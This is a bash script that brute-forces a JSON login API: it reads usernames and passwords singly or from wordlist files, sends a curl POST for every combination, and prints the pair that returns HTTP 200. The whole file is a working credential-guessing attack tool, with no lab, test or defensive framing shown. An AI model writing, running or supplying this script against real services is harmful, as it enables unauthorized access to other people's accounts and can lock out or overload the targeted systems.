#!/bin/bash

# Function to display usage information
usage() {
    echo "Usage: $0 -u URL -U USERNAME [-f USERNAME_FILE] -p PASSWORD [-P PASSWORD_FILE]"
    echo "  -u URL                : The URL of the login API"
    echo "  -U USERNAME           : Single username for login attempts"
    echo "  -f USERNAME_FILE      : File containing list of usernames for brute force"
    echo "  -p PASSWORD           : Single password for login attempts"
    echo "  -P PASSWORD_FILE      : File containing list of passwords for brute force"
    exit 1
}

# Variables to store the options
URL=""
USERNAME=""
USERNAME_FILE=""
PASSWORD=""
PASSWORD_FILE=""

# Start a loop to process the command-line options
while getopts ":u:U:f:p:P:" opt; do
    # Use a case statement to handle each option
    case $opt in
        # If the option is '-u', store its argument in the variable 'URL'
        u)
            URL=$OPTARG
            ;;
        # If the option is '-U', store its argument in the variable 'USERNAME'
        U)
            USERNAME=$OPTARG
            ;;
        # If the option is '-f', store its argument in the variable 'USERNAME_FILE'
        f)
            USERNAME_FILE=$OPTARG
            ;;
        # If the option is '-p', store its argument in the variable 'PASSWORD'
        p)
            PASSWORD=$OPTARG
            ;;
        # If the option is '-P', store its argument in the variable 'PASSWORD_FILE'
        P)
            PASSWORD_FILE=$OPTARG
            ;;
        # If an unknown option is provided, call the 'usage' function (which likely prints help information)
        *)
            usage
            ;;
    esac
done

# Check if URL is provided
if [ -z "$URL" ]; then
    echo "Error: URL is required."
    usage
fi

# Check if at least one username source is provided
if [ -z "$USERNAME" ] && [ -z "$USERNAME_FILE" ]; then
    echo "Error: Either a single username or a file with usernames is required."
    usage
fi

# Check if at least one password source is provided
if [ -z "$PASSWORD" ] && [ -z "$PASSWORD_FILE" ]; then
    echo "Error: Either a single password or a file with passwords is required."
    usage
fi

# Function to make a POST request with curl
make_request() {
    local username=$1
    local password=$2
    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
        -H "Content-Type: application/json" \
        -d "{\"UserName\": \"$username\", \"Password\": \"$password\"}")

    echo $response
}

# Read usernames and passwords, make requests
if [ -n "$USERNAME_FILE" ]; then
    usernames=$(cat "$USERNAME_FILE")
else
    usernames=$USERNAME
fi

if [ -n "$PASSWORD_FILE" ]; then
    passwords=$(cat "$PASSWORD_FILE")
else
    passwords=$PASSWORD
fi

for username in $usernames; do
    for password in $passwords; do
        status_code=$(make_request "$username" "$password")
        if [[ "$status_code" -eq 200 ]]; then
            echo "Success! Username: $username Password: $password"
            break 2
        else
            echo "Failed login with Username: $username Password: $password (HTTP status: $status_code)"
        fi
    done
done
